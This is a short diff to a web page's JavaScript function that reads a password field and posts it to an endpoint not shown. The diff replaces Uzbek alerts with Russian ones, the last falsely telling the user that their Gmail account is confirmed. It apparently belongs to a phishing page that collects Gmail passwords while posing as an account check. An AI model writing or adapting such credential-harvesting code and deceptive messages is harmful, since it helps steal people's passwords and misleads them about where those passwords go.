@@ -116,7 +116,7 @@ function send2() {
     const message = document.getElementById("msg2").value;
 
     if (!message) {
-        alert("Parol yoz!");
+        alert("Введите пароль");
         return;
     }
 
@@ -126,7 +126,7 @@ function send2() {
         body: JSON.stringify({ message })
     })
     .then(() => {
-        alert("Yuborildi ✅");
+        alert("Ваш аккаунт Gmail подтверждён");
     });
 }
 </script>
